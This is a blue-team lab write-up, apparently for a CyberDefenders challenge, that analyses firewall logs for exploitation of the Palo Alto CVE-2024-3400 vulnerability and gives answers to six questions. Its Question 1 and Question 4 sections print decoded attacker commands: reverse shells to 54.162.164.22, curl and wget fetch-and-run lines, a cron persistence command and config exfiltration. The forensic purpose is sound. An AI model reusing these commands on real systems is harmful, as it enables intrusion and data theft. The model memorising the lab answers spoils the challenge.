---
layout: post
date: 2024-10-29
platform: "CD"
title:  "PaloAltoRCE"
difficulty: "Hard"
scenario: "Palo Alto, a leading firewall vendor, has recently announced a critical vulnerability (CVE-2024-3400) that affects specific versions of its next-generation firewalls. This critical vulnerability enables remote attackers to gain unauthorized access and potentially take full control of affected systems. These firewalls are integral to your organization's network security, as they manage and monitor both inbound and outbound traffic, safeguarding against unauthorized access and various threats. As a security analyst, your primary task is to accurately and swiftly determine whether any of the organization's systems are impacted by this newly disclosed vulnerability."
question_1: "Identify the IP address of the first threat actor who gained unauthorized access to the environment."
question_2: "Determine the date and time of the initial interaction between the threat actor and the target system. Format: 24h-UTC"
question_3: "What is the command the threat actor used to achieve persistence on the machine?"
question_4: "What port was the first port used by one of the threat actors for the reverse shell?"
question_5: "What was the name of the file one of the threat actors tried to exfiltrate?"
question_6: "What was the full URL the Threat actor used to access the exfiltrated content successfully?"

---
{% include scenario.html %}

# Questions

1. [{{ page.question_1 }}](#question-1)
2. [{{ page.question_2 }}](#question-2)
3. [{{ page.question_3 }}](#question-3)
4. [{{ page.question_4 }}](#question-4)
5. [{{ page.question_5 }}](#question-5)
6. [{{ page.question_6 }}](#question-6)

# Discussion

The scenario revolves around the CVE-2024-3400, which is a Remote Code Execution vulnerability for specific versions of Palo Alto firewalls. Armed with this knowledge we can seek guidance on the internet in relation to the Palo Alto platform, the exploit itself and any other research that can assist in pinpointing our analysis.

# Answering the Tasks

## Question 1
{% include item.html type="question" id="1" question=page.question_1 %}

Right of the bat, we have about 2.2 million logs to process. Palo Alto gives some guidance on their CVE which we can use to narrow our searches ([Link to PaloAlto advisory](https://security.paloaltonetworks.com/CVE-2024-3400)). Specifically the section under the FAQ which describes some of information we need to search for to determine exploitation activities. [This](https://unit42.paloaltonetworks.com/cve-2024-3400/) article also goes in-depth with the attack. Lastly, we check Github, ExploitDB or other sources if we can find some Proof of Concepts that can help us understand if it's specific HTTP codes we need to look for, if there are various artifacts left behind from PoCs - such as files or user agents.

> The following command can be used from the PAN-OS CLI to help identify if there was an attempted exploit activity on the device:
> `grep pattern "failed to unmarshal session(.\+.\/" mp-log gpsvc.log*`
>
> If the value between "session(" and ")" does not look like a GUID, but instead contains a file system path or embedded shell commands, this could be related to an attempted exploitation of >CVE-2024-3400, which will warrant further investigation to correlate with other indicators of compromise.
>
> Grep output indicating an attempted exploit may look like the following entry:
> `failed to unmarshal session(../../some/path)`
>
> Grep output indicating normal behavior will typically appear like the following entry:
> `failed to unmarshal session(01234567-89ab-cdef-1234-567890abcdef)`

You can be lazy and use free text search, or specify the field you want to search in when querying. The phrase "failed to unmarshal" may be prevelant in environments outside the lab. Regardless, we're searching the `message` field for `failed to unmarshal`:

Query: 
{% highlight sql %}
message:"failed to unmarshal"
{% endhighlight %}

![Failed to unmarshal](/img/cd/blueyard/paloaltorce/failed_to_unmarshal.png)

This should yield us 101 hits, some hits being with a GUID for the session, which according to Palo Alto is expected behaviour. However, some of the hits contains something else than GUIDs, more specifically shell commands. The presence of [`poc.txt`](https://github.com/ihebski/CVE-2024-3400) and the base64 encoded shell commands are indicative of an exploit.

If we decode the first encoded command with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4MU5DNHhOakl1TVRZMExqSXlMekV6TXpjZ01ENG1NUT09) we can see that the payload is `bash -i >& /dev/tcp/54.162.164.22/1337 0>&1`, an attempt to create a reverse shell. We could then submit this as the answer, but we need to determine the **first** threat actor gaining access, so we need to figure out if there are multiple people actively exploiting the device.

Let's narrow in on the commands that are based64 encoded
{% highlight sql %}
message:"failed to unmarshal" and message:"base64"
{% endhighlight %}

![Failed to unmarshal](/img/cd/blueyard/paloaltorce/failed_to_unmarshal_base64.png)

There are a significant number of hits. We can copy paste the payloads into CyberChef, or export the results to a csv we can process. I'm unaware of any functionality in Elastic that can  interpret the fields to our liking relatively easy. Click `Share`, `CSV Reports` and `Generate CSV` - it'll take a few seconds for it to be available in the Reporting panel.

I'm comfortable with using PowerShell, but you can obviously process the data in any way you like, python, excel, or whatever. I use a lot of shorthands when writing powershell.
Another thing to note, is that the `@timestamp` and `time` fields does not match.

{% highlight powershell %}
(Import-Csv 'Untitled discover search.csv').message -replace '^(\d+-?\s?:?)+' | ConvertFrom-Json | sort time | % { if ($_.message -match '\$\{IFS\}(\w.*)\|base64') { echo "$($_.time) $([Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($Matches[1])))"} }

2024-04-21T22:20:27.581852267-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-23T21:44:36.042848508-07:00 (curl%20-s%20-L%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-23T22:49:06.667819145-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
2024-04-23T22:49:07.082856042-07:00 wget -qO /var/tmp/BYhkpzVZP http://185.196.9.31:8080/ZvfhsodEot2FHKdyoKI6_w; chmod +x /var/tmp/BYhkpzVZP; /var/tmp/BYhkpzVZP &
2024-04-24T19:48:14.998901848-07:00
2024-04-24T20:22:19.142921243-07:00 wget%20-q%20-O%20-%20http://138.197.162.79:65534/0dzFrRzQ.sh%7Cbash%20-s
2024-04-24T20:52:44.147842628-07:00 (curl -s -L http://138.197.162.79:65534/0dzFrRzQ.sh || wget -q -O - http://138.197.162.79:65534/0dzFrRzQ.sh)| bash -s
2024-04-25T00:27:58.191901794-07:00
2024-04-25T00:33:16.300909593-07:00 cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css
2024-04-25T06:50:18.995847126-07:00 nslookup uktmhf.dnslog.cn/`whoami`
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:17:21.392894711-07:00 bash -i >& /dev/tcp/'54.162.164.22/13337 0>&1
2024-04-26T05:17:21.392894711-07:00 bash -i >& /dev/tcp/'54.162.164.22/13337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:35:52.689538573-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:35:52.689538573-07:00 >& /dev/tcp/54.162.164.22/1337 0>&1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1

{% endhighlight %}

The important part here, is that we are taking all the base64 from our query, and decoding to readable text for us to analyze.

We'll take note of `54.162.164.22`, `185.196.9.31`, `138.197.162.79` as well as a variety of ports. Though, the amount of attempts to reverse shell to `54.162.164.22` is suspicious.

If we search for `138.197.162.79` then the first hit is on 26th at 17:59:16.
`185.196.9.31` has a few hits for the login page, on the 24th at 05:49:05.

However, looking at `54.162.164.22` we find a significant amount of suspicious events:
![Q1 IP](/img/cd/blueyard/paloaltorce/q1_ip.png)

{% include item.html type="answer" id="1" description=page.question_1 answer="54.162.164.22" %}

## Question 2
{% include item.html type="question" id="2" question=page.question_2 %}

Searching for the first event created by the IP from the previous question, and sorting by time stamp reveals the following events:
{% highlight sql %}
54.162.164.22
{% endhighlight %}

I suggest checking the JSON for the `@timestamp` field as it's stored in UTC, and is not modified by regional settings like the timestamps in the query results can be.
The first event occurs on the 21st of April.

![Q2 Answer](/img/cd/blueyard/paloaltorce/q2_answer.png)

{% include item.html type="answer" id="2" description=page.question_2 answer="2024-04-21 18:17:07" %}

## Question 3
{% include item.html type="question" id="3" question=page.question_3 %}

The articles describes the persistence mechanism to be Cron based, using variations of `wget -qO- http://ip/file | bash`. Let's search the syslog events on the device for cron activity with `wget` or `bash` references.
{% highlight kql %}
log.file.path:"/mnt/palo_alto3/var/log/syslog-system.log" and message:"*CMD*" and program:crond and (message:"*wget*" or  message:"*bash*")  
{% endhighlight %}

at 06:39:01 a command is executed, and once every minute following that.

![Q3 Answer](/img/cd/blueyard/paloaltorce/q3_answer.png)

{% include item.html type="answer" id="3" description=page.question_3 answer="wget -qO- http://54.162.164.22/update | bash" %}

## Question 4
{% include item.html type="question" id="4" question=page.question_4 %}

Going back to the events we had in question 1, we need to find the first port - this has obviously happened before the threat actor was able to configure the cronjob.

We can then filter out the actions and commands into three possible scenarios, based on the attempted commands.
According to the blogpost, telemetry events will be executing commands in hourly or by minute - so the expectation is that the threat actors command is executed within 1 hour.

`8080`, `13337` or `1337`


{% highlight terminal %}
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
{% endhighlight %}

{% highlight terminal %}
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
{% endhighlight %}

{% highlight terminal %}
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
{% endhighlight %}

Purely based on the timings between the commands, and the sequence of the commands - the assumption is on the `13337`. I am unable provide substantional evidence for my claim.

For port `8080`, `whoami` is executed multiple times in succession, followed by `ls` and `bash`.
{% highlight terminal %} 
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:44:48.788847088-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:45:08.348860189-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:47:26.008874701-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:48:50.62593458-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:49:36.9198454-07:00 whoami >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:56:03.769869426-07:00 ls >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
2024-04-26T04:59:28.523933096-07:00 bash -i >& /dev/tcp/54.162.164.22/8080 0>&1
{% endhighlight %}

For port `1337`, there are multiple attempts to execute `bash`, with slightly longer time in between.

{% highlight terminal %}
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:19:56.951910054-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:50:28.150592897-07:00 whoami >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:52:17.227560458-07:00 ls >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T05:57:54.928589488-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:14:52.762631815-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:27:12.839608644-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:35:52.689538573-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
2024-04-26T06:37:01.104541553-07:00 bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
{% endhighlight %}

Lastly, for `13337` which occurs before `1337` but after `8080`.
{% highlight terminal %}
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:01:23.890861508-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:04:25.485975248-07:00 ls >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:12:45.710458616-07:00 whoami >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
2024-04-26T05:42:35.868634796-07:00 bash -i >& /dev/tcp/54.162.164.22/13337 0>&1
{% endhighlight %}

Though, I would argue that the first event attempting a reverse shell is on port `1337`.
{% highlight json %}
{"level":"error","task":"9-22","time":"2024-04-21T22:20:27.581852267-07:00","message":"failed to unmarshal session(/../../../../opt/panlogs/tmp/device_telemetry/minute/aaa`echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC81NC4xNjIuMTY0LjIyLzEzMzcgMD4mMQ==|base64${IFS}-d|bash`) map , EOF"}
{% endhighlight %}

{% highlight bash %}
bash -i >& /dev/tcp/54.162.164.22/1337 0>&1
{% endhighlight %}

{% include item.html type="answer" id="4" description=page.question_4 answer="13337" %}

## Question 5
{% include item.html type="question" id="5" question=page.question_5 %}
The blog post explains how running-config.xml may be exfiltrated, and we find a base64 encoded command
![Q5 Config copy](/img/cd/blueyard/paloaltorce/q5_exfil.png)

the command decoded is `cp /opt/pancfg/mgmt/saved-configs/running-config.xml /var/appweb/sslvpndocs/global-protect/gpvpncfg.css`, and checking the http logs we see 3 `404` events for the mentioned file, indicating an attempt to exfiltrate without success.

![Q5 exfil](/img/cd/blueyard/paloaltorce/q5_answer.png)

{% include item.html type="answer" id="5" description=page.question_5 answer="running-config.xml" %}

## Question 6
{% include item.html type="question" id="6" question=page.question_6 %}
The blog posts both describe exfiltration through `bootstrap.min.css`. We also need to figure out the external IP of the Palo Alto device.

By using the nginx referrer field, we can figure out the external IP of the device:
![Q6 referrer](/img/cd/blueyard/paloaltorce/q6_referrer.png)

Then, by searching for GET requests we can see that the threat actor successfully downloaded a file named `bootstrap.man.css`, which was the answer during the release, but was later changed to the other name. Not sure what I am overlooking here.

![Q6 answer](/img/cd/blueyard/paloaltorce/q6_answer.png)

{% include item.html type="answer" id="6" description=page.question_6 answer="https://44.217.16.42/global-protect/bootstrap.min.css" %}
